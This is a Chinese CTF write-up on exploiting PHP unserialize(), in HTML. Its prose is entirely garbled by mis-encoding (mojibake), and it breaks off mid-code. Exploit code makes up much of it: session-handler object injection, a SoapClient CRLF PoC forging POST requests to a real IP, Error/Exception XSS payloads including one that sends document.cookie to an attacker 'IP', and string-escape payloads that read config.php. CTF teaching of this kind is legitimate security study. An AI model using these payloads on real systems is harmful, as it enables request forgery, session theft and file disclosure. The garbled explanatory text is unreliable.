<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize.handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz = <span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†payloadæ”¹ä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print_r(scandir(dirname(__FILE__)));</span><br><span class="line"><span class="comment">#åºåˆ—åŒ–åçš„ç»“æœ</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>scandirç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•</li>
<li>dirnameå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</li>
<li><code>__FILE__</code> phpä¸­çš„é­”æ³•å¸¸é‡,æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚å¦‚æœç”¨åœ¨è¢«åŒ…å«æ–‡ä»¶ä¸­ï¼Œåˆ™è¿”å›è¢«åŒ…å«çš„æ–‡ä»¶å</li>
</ul>
<p>ä¸ºé˜²æ­¢åŒå¼•å·è¢«è½¬ä¹‰ï¼Œåœ¨åŒå¼•å·å‰åŠ ä¸Š\ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜è¦åŠ ä¸Š|</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°æ–‡ä»¶åHere_1s_7he_fl4g_buT_You_Cannot_see.php</p>
<p>å¾—åˆ°æ–‡ä»¶åä¹‹åè¿˜å¾—æŸ¥çœ‹è·¯å¾„ï¼Œåœ¨phpinfoé‡Œé¢æŸ¥çœ‹</p>
<img src="http://img.kawhi.xyz/image-20200711213050621.png" style="high:80%;width:80%;" />

<p>å¾—åˆ°è·¯å¾„ä¹‹åæ”¹ä¸‹payloadå³å¯å¾—åˆ°flagã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711213202557.png" style="high:80%;width:80%;" />

<h3 id="ååºåˆ—åŒ–åŸç”Ÿç±»çš„åˆ©ç”¨"><a href="#ååºåˆ—åŒ–åŸç”Ÿç±»çš„åˆ©ç”¨" class="headerlink" title="ååºåˆ—åŒ–åŸç”Ÿç±»çš„åˆ©ç”¨"></a><strong>ååºåˆ—åŒ–åŸç”Ÿç±»çš„åˆ©ç”¨</strong></h3><p>ä»€ä¹ˆæƒ…å†µéœ€è¦è€ƒè™‘åŸç”Ÿç±»å‘¢ï¼Œé¢˜ç›®æ‰¾ä¸åˆ°POPé“¾çš„æ—¶å€™å¯ä»¥è€ƒè™‘PHPåŸç”Ÿç±»ã€‚</p>
<h4 id="callçš„åŸç”Ÿç±»"><a href="#callçš„åŸç”Ÿç±»" class="headerlink" title="__callçš„åŸç”Ÿç±»"></a>__callçš„åŸç”Ÿç±»</h4><p>SoapClientç®—æ˜¯ç›®å‰è¢«æ¯”è¾ƒå¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œphp5ã€7éƒ½å­˜åœ¨æ­¤ç±»ã€‚æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•ã€‚</p>
<p>å…ˆæ¥çœ‹è¿™æ ·ä¸€æ®µä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://134.175.168.213:5555/path&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200712162931204.png" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹å‡ºï¼ŒSOAPActionå¤„å¯æ§ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯å¦‚æœContent-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typeï¼Œä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®ï¼Œè¿™é‡Œçš„å±€é™æ€§å°±æ˜¯ä»…é™äºhttp/httpsåè®®ï¼Œä½†æ˜¯è¿™é‡Œhttpå¤´éƒ¨è¿˜å­˜åœ¨crlfæ¼æ´ï¼Œå¯ä»¥æŠŠ<code>\r\n</code>å³<code>%0d%0a</code>æ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ã€‚</p>
<p>è¿™é‡Œè´´ä¸€ä¸‹wupcoå¸ˆå‚…çš„poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://134.175.168.213:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=kawhi&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;not_exists_function();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200712164137201.png" style="high:80%;width:80%;" />

<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLF<strong>å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚</strong>ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€é“buuçš„é¢˜bestphpâ€™s revengeå¯ä»¥ç»“åˆSoapClientå’Œä¸Šé¢çš„sessionååºåˆ—åŒ–ä¸€èµ·ç†è§£ï¼Œè¿™é‡Œæœ‰ä¸ªwriteupå†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p>
<p>åœ°å€ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p>
<h4 id="toStringçš„åŸç”Ÿç±»"><a href="#toStringçš„åŸç”Ÿç±»" class="headerlink" title="__toStringçš„åŸç”Ÿç±»"></a>__toStringçš„åŸç”Ÿç±»</h4><p>è¿™æ˜¯æˆ‘åœ¨buuä¸Šé¢åˆ·åˆ°çš„ä¸€é¢˜åä¸º[BJDCTF 2nd]xssä¹‹å…‰ï¼Œé€šè¿‡è¿™é“é¢˜æ¥ç†è§£ã€‚</p>
<p>é¦–å…ˆæ˜¯gitæ³„éœ²è·å–åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GEzheT[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªechoï¼Œæˆ‘ä»¬å¯ä»¥å¯¹<code>__toString</code>çš„åŸç”Ÿç±»è¿›è¡Œååºåˆ—åŒ–</p>
<p>åŸºç¡€çŸ¥è¯†</p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªåŸç”Ÿç±»ï¼Œä¸€ä¸ªErrorä¸€ä¸ªExceptionã€‚</p>
<p><strong>Error</strong></p>
<p>é€‚ç”¨äºphp7ç‰ˆæœ¬</p>
<p>è¿™é‡Œæµ‹è¯•ä»£ç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">&#x27;yds&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå¼¹çª—</p>
<img src="http://img.kawhi.xyz/image-20200711143646347.png" style="high:80%;width:80%;" />

<p><strong>Exception</strong></p>
<p>é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬</p>
<p>è¿™ä¸ªç±»åˆ©ç”¨çš„æ–¹å¼å’ŒåŸç†å’ŒError ç±»ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯é€‚ç”¨äºphp5å’Œphp7ï¼Œç›¸å¯¹ä¹‹ä¸‹æ›´åŠ å¥½ç”¨ã€‚</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">&#x27;yds&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åŒæ ·æˆåŠŸå¼¹çª—ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200711143829700.png" style="high:80%;width:80%;" />

<p>æœ¬é¢˜payloadä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = serialize(<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;IP&#x27;+document.cookie&lt;/script&gt;&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‰“è¿‡å»å³å¯è·å¾—flagã€‚</p>
<h3 id="å­—ç¬¦é€ƒé€¸"><a href="#å­—ç¬¦é€ƒé€¸" class="headerlink" title="å­—ç¬¦é€ƒé€¸"></a><strong>å­—ç¬¦é€ƒé€¸</strong></h3><p>å­—ç¬¦é€ƒé€¸åˆ†ä¸¤ç§</p>
<ul>
<li>ç¬¬ä¸€ç§ä¸ºå…³é”®è¯æ•°å¢åŠ </li>
<li>ç¬¬äºŒç§ä¸ºå…³é”®è¯æ•°å‡å°‘</li>
</ul>
<h4 id="å…³é”®è¯æ•°å¢åŠ å­—ç¬¦é€ƒé€¸"><a href="#å…³é”®è¯æ•°å¢åŠ å­—ç¬¦é€ƒé€¸" class="headerlink" title="å…³é”®è¯æ•°å¢åŠ å­—ç¬¦é€ƒé€¸"></a><strong>å…³é”®è¯æ•°å¢åŠ å­—ç¬¦é€ƒé€¸</strong></h4><p>åœ¨åšé¢˜ç›®ä¹‹å‰å…ˆçœ‹çœ‹å­—ç¬¦æ˜¯å¦‚ä½•é€ƒé€¸çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;defg&#x27;</span>);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string(<span class="number">49</span>) <span class="string">&quot;a:3:&#123;i:0;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;i:1;s:3:&quot;</span>abc<span class="string">&quot;;i:2;s:4:&quot;</span>defg<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å†ååºåˆ—åŒ–å›æ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span></span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">&quot;defg&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–æ˜¯ä»¥<code>&quot;;&#125;</code>ç»“æŸçš„ã€‚</p>
<p>å¦‚æœè¿™é‡Œæˆ‘ä»¬æŠŠ<code>abc</code>æ¢æˆ<code>abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;</code></p>
<p>è¿è¡Œçš„ç»“æœæ˜¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span></span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">&quot;qwert&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥çœ‹åˆ°å­—ç¬¦ä¸²æˆåŠŸé€ƒé€¸å‡ºæ¥ã€‚ç°åœ¨å›åˆ°é¢˜ç›®ä¸­ï¼Œè¿™æ˜¯ä¹Ÿæ˜¯ä¸€é“buuä¸Šçš„é¢˜ç›®åä¸º[0CTF 2016]piapiapiaï¼Œè¿™é¢˜æ˜¯æ‰«ç›®å½•å…ˆæ‰«å‡ºæ¥<a href="http://www.zip./">www.zipã€‚</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå‘ç°flagåœ¨config.phpé‡Œé¢ï¼Œæˆ‘ä»¬æ„é€ åŒ…å«config.phpçš„æ•°æ®ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œç„¶ååœ¨profile.phpä¸­è¯»å–å‡ºæ¥ã€‚</p>
<p>çœ‹åˆ°update.phpè¿™é‡Œ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„å‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬éœ€è¦æŠŠphotoçš„å€¼æ›¿æ¢ä¸º<code>config.php</code>ï¼Œåœ¨nicknameåé¢åŠ ä¸Š<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œè¿™æ ·çš„è¯åé¢çš„ä»£ç å°±ä¸å†æ‰§è¡Œäº†ã€‚</p>
<p>è¿™é‡Œnicknameæ˜¯æœ‰é™åˆ¶çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ç„¶é¹…è¿™ä¸ªé™åˆ¶æ•°ç»„å³å¯ç»•è¿‡ï¼šnickname[]=</p>
<p>$profileåºåˆ—åŒ–ä¹‹åé•¿è¿™æ ·</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/327a6c4304ad5938eaf0efb6cc3e53dc&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹class.phpä¸‹é¢çš„å…³é”®ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">	$username = parent::filter($username);</span><br><span class="line">	$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">	return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">	$escape = array(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = array(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯æˆ‘ä»¬å­—ç¬¦ä¸²é€ƒé€¸åˆ©ç”¨çš„åœ°æ–¹</p>
<p>æˆ‘ä»¬çš„ç›®çš„æ˜¯æƒ³è®©<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>è¢«æ‹¼æ¥åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œï¼Œè€Œä¸æ˜¯è¢«å½“åšnicknameçš„å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$profile = a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:8:&quot;</span>ss@q.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;a:1:&#123;i:0;s:204:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/327a6c4304ad5938eaf0efb6cc3e53dc&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>çš„é•¿åº¦ä¸º34ä¸ªå­—ç¬¦ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³æŠŠä»–ä½œä¸ºnicknameçš„å€¼ï¼Œå°±éœ€è¦é€ƒé€¸34ä¸ªå­—ç¬¦ï¼Œéœ€è¦æŠŠwhereæ¢æˆhackerï¼Œç„¶åå°±å¯ä»¥æˆåŠŸé€ƒé€¸ã€‚å› ä¸º<code>&quot;;&#125;</code>æ˜¯ååºåˆ—é—­åˆçš„æ ‡å¿—ï¼Œåé¢çš„uploadå°±ä¸ç”¨ç®¡äº†ã€‚ç„¶ååœ¨profile.phpé‡Œé¢photoå°±ä¼šè¯»å–åˆ°config.phpçš„å€¼ã€‚</p>
<p>ç„¶åæ¥ä¸‹æ¥å°±æ˜¯æ³¨å†Œç™»å½•ç„¶ååœ¨update.phpé‡Œé¢ä¸Šä¼ nicknameï¼Œç„¶ååœ¨profile.phpæ‰“å¼€å›¾ç‰‡æŸ¥çœ‹base64ç¼–ç çš„config.phpï¼Œå³å¯æŸ¥çœ‹flagã€‚</p>
<h4 id="å…³é”®è¯æ•°å‡å°‘å­—ç¬¦é€ƒé€¸"><a href="#å…³é”®è¯æ•°å‡å°‘å­—ç¬¦é€ƒé€¸" class="headerlink" title="å…³é”®è¯æ•°å‡å°‘å­—ç¬¦é€ƒé€¸"></a><strong>å…³é”®è¯æ•°å‡å°‘å­—ç¬¦é€ƒé€¸</strong></h4><p>è¿™é‡Œæ˜¯ä¸€é“buuä¸Šçš„[å®‰æ´µæ¯ 2019]easy_serialize_phpé¢˜ç›®</p>
<p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    